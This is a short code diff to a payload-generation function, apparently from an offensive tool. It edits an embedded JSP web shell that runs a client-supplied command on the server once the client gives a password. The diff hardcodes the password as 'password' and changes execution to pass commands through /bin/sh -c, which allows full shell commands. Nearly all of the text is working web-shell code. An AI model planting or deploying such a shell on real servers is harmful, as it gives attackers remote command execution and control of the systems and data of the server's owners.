@@ -491,12 +491,17 @@ def preparePayload(opts):
 <%%@page import="java.net.*"%%>
 <%%!
 	public String execute(String pass, String cmd) {
-		final String hardcodedPass = "%(password)s";
+		final String hardcodedPass = "password";
 		StringBuilder res = new StringBuilder();
+		String[] cmd2 = {
+			"/bin/sh",
+			"-c",
+			cmd
+			};
 
 		if (cmd != null && cmd.length() > 0 && (pass.equals(hardcodedPass) || hardcodedPass.toLowerCase().equals("none"))){
 			try {
-				Process proc = Runtime.getRuntime().exec(cmd);
+				Process proc = Runtime.getRuntime().exec(cmd2);
 				OutputStream outs = proc.getOutputStream();
 				InputStream ins = proc.getInputStream();
 				DataInputStream datains = new DataInputStream(ins);
